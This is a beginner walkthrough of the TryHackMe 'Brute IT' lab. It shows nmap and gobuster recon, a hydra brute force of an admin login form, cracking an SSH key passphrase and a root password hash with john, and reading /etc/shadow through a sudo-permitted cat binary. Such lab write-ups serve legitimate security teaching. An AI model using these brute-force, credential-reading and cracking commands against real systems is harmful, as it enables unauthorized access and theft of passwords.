![0xRar](https://user-images.githubusercontent.com/33517160/130546319-a1634c4c-b598-44fd-b6f4-ad3b3c930de0.png)

# Brute IT -Tryhackme Writeup
### room link: https://tryhackme.com/room/bruteit
Detailed and beginner friendly writeup.

## First Look:
- From the first look i see that we have some bruteforcing to do of course more importantly this room is a practice for bruteforcing and its made for beginners as the difficulty suggests. 

## Recon:
- In the recon we need to map the network (using nmap) to understand what exactly we're attacking and what services  we can exploit or in this case what can we brute force in order to gain access.

```
nmap -p- -sV -T4 MACHINE_IP

Nmap scan report for MACHINE_IP
Host is up (0.13s latency).
Not shown: 65501 closed ports, 32 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Flags Used:
- `-p-`  to scan for every port
- `-sV` to get service versions
- `-T4` for the highest threads so we scan a lot faster

We can see the http service running which is a web server running on port `80` which is the default for the http service, when you see a web server running the first thing you do is directory bruteforcing to see if there is any hidden directories or files, you can use tools like: dirb, dirbuster, ffuf, gobuster.

I like to use gobuster so thats what am going to use to get any directory or file.

```
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt

/admin                (Status: 301) [Size: 314] [--> http://MACHINE_IP/admin/]
```

Flags Used:
- `-u` for the website link
- `-w` for the wordlist

we found an admin page lets head there and see what we have, this is where we attack we can see a login page for the admin always open the source code to see whats going on on that page, suprisingly enough we found the username in a comment.

`<!-- Hey john, if you do not remember, the username is admin -->`

## Gaining Access:
now we just need to bruteforce for the password using a tool called `hydra`
the http-form syntax is annoying to write but you will always find resources online

as we can see in the form in the /admin page source code the params are:
```
the username: name="user"
the password: name="pass"

params: name=&pass=

and we need the error message as well, enter anything and try to login doing that will give as the error message which is "Username or password invalid"
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz MACHINE_IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

Output:
`[80][http-post-form] host: MACHINE_IP   login: admin   password: `

the password is removed so you can try it by yourself.

By logging in we will find the Web flag and an RSA  Private Key
so we can have access to ssh and gain a shell on the machine but not yet! 

- we need to get the passphase of the RSA Private Key by using a really famous cracking tool called john the ripper.

first we need to get the `id_rsa` hash by using `ssh2john` its in `/usr/share/john/ssh2john.py` by default.

`sudo python /usr/share/john/ssh2john.py id_rsa > hash`

now lets crack the hash using john:
unzip rockyou first using this command :`gzip -d rockyou.txt.gz`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

now that we have the passphase for the private key lets connect to ssh:

if you can remember the comment from the source code had a name which is `john` that would be a possible username.

`ssh -i id_rsa john@MACHINE_IP`

now we gained access !!! :)
`cat user.txt` to get the user flag

## Privilege Escalation:
When you need to escalate your privilege first thing you do is finding a binary or a writeable file that is owned by the root user aka the super user.

first command you do is `sudo -l`

we already see a binary called `cat` lets go and search for an exploit for it in [gtfobins](gtfobins.github.io) which is a something close to a database but for privilege escalation.

ok, the exploit for it is really easy you just need to use the cat command to read the root flag.

`sudo cat /root/root.txt`

now that we have the root flag the only thing left is the root password and the linux stores the passwords in a file called `/etc/shadow` and the usernames in `/etc/passwd`

lets do the samething we did to the root.txt
`sudo cat /etc/shadow` 

```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

the hash starts with `$6$` which is a SHA512CRYPT, now i will use john to crack it but another choice would be hashcat.

put the root hash in a file than run john again.

`john -w=/usr/share/wordlists/rockyou.txt roothash`

That was the machine
Happy Hacking :)
